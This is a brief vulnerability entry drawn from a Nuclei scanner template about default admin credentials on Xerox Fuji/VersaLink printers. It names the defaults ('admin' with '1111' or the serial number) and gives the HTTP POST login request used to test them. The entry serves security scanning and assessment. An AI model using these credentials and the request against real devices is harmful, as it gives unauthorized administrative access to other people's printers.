# Vulnerability: Xerox Fuji/VersaLink - Default Login
**Classification:** XEROX
**Source:** Nuclei Template (`xerox-default-login.yaml`)

## Description
The default login credentials for Xerox Fuji/VersaLink devices were used to access the admin panel during setup, typically with “admin” as the username and a default password like “1111” or the device serial number.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /LOGIN.cmd HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/home/index.html

NAME={{base64(username)}}&PSW={{base64(password)}}
```

